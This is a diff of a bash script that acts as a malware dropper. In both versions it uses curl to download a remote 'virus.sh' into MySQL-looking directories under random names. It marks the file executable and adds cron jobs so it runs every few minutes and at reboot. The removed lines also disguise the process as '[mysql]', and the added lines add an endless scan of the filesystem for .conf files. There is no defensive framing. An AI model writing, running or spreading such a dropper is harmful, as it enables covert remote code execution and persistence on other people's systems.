@@ -1,15 +1,14 @@
-GITHUB_SCRIPT_URL="https://raw.githubusercontent.com/Zend1X/virus/refs/heads/main/virus.sh"
-MYSQL_DIRS=("/tmp/mysql" "/var/tmp/mysql" "/dev/shm/mysql" "/run/mysql" "/var/lib/mysql")
+#!/bin/bash
 
-generate_name() {
-    PREFIXES=("ibdata" "ib_logfile" "mysql-bin" "undo" "redo" "ibtmp" "binlog" "relay-log" "mysql" "innodb")
-    RANDOM_INDEX=$((RANDOM % ${#PREFIXES[@]}))
-    RANDOM_PREFIX=${PREFIXES[$RANDOM_INDEX]}
-    RANDOM_NUMBER=$((RANDOM % 10000))
-    echo "$RANDOM_PREFIX$RANDOM_NUMBER"
+GITHUB_SCRIPT_URL="https://raw.githubusercontent.com/Zend1X/virus/refs/heads/main/virus.sh"
+
+MYSQL_DIRS=("/tmp/mysql")
+
+generate_random_name() {
+    cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 12 | head -n 1
 }
 
-find_dir() {
+find_mysql_dir() {
     for dir in "${MYSQL_DIRS[@]}"; do
         mkdir -p "$dir" 2>/dev/null
         if [ -w "$dir" ]; then
@@ -21,36 +20,25 @@ find_dir() {
     echo "/tmp/mysql"
 }
 
-process() {
-    exec -a "[mysql]" "$SCRIPT_PATH" 2>/dev/null &
-    echo "[!] Запущен ложный процесс с именем: [mysql] (PID: $!)"
-    echo "[!] Путь к скрипту: $SCRIPT_PATH"
-}
-
 main() {
-    MYSQL_DIR=$(find_dir)
-    RANDOM_NAME=$(generate_name)
-    SCRIPT_PATH="$MYSQL_DIR/$RANDOM_NAME"
-    
-    echo "[+] Выбрана директория: $MYSQL_DIR"
-    echo "[+] Сгенерировано имя: $RANDOM_NAME"
+    MYSQL_DIR=$(find_mysql_dir)
+    RANDOM_NAME=$(generate_random_name)
+    SCRIPT_PATH="${MYSQL_DIR}/${RANDOM_NAME}.sh"
 
-    if ! crontab -l 2>/dev/null | grep -q "$SCRIPT_PATH"; then
-        echo "[*] Скачивание скрипта из: $GITHUB_SCRIPT_URL"
+    if [ ! -f "$SCRIPT_PATH" ]; then
         curl -s "$GITHUB_SCRIPT_URL" -o "$SCRIPT_PATH"
         chmod +x "$SCRIPT_PATH"
-        echo "[*] Скрипт сохранен в: $SCRIPT_PATH"
-
-        (crontab -l 2>/dev/null
-        echo "*/9 * * * * $SCRIPT_PATH >/dev/null 2>&1"
-        echo "@reboot $SCRIPT_PATH >/dev/null 2>&1"
-        ) | crontab -
-        echo "[*] Задачи cron добавлены для автоматического запуска"
-    else
-        echo "[+] Скрипт уже существует в cron"
     fi
 
-    process
+    if ! crontab -l 2>/dev/null | grep -q "$SCRIPT_PATH"; then
+        (crontab -l 2>/dev/null; echo "*/5 * * * * $SCRIPT_PATH") | crontab -
+        (crontab -l 2>/dev/null; echo "@reboot $SCRIPT_PATH") | crontab -
+    fi
+
+    while true; do
+        find / -name "*.conf" 2>/dev/null | head -n 100 >/dev/null
+        sleep 60
+    done
 }
 
 main
